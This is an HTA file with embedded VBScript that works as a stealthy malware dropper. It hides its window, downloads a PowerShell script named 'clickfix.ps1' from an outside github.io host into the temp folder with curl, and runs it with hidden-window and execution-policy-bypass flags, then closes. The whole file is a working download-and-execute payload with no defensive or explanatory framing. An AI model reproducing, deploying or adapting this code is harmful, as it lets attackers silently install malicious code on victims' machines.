<html>
<head><title>.</title>
<hta:application id="o" showintaskbar="no" caption="no" border="none" windowstate="minimize" />
<script language="VBScript">
On Error Resume Next
Dim s,f,t,p,u
Set s = CreateObject("WScript.Shell")
Set f = CreateObject("Scripting.FileSystemObject")
t = f.GetSpecialFolder(2)
p = t & "\c.ps1"
u = "https://kai195102.github.io/d/clickfix.ps1"
s.Run "curl -sLo """ & p & """ """ & u & """", 0, True
s.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -F """ & p & """", 0, False
window.close()
</script>
</head>
<body></body>
</html>
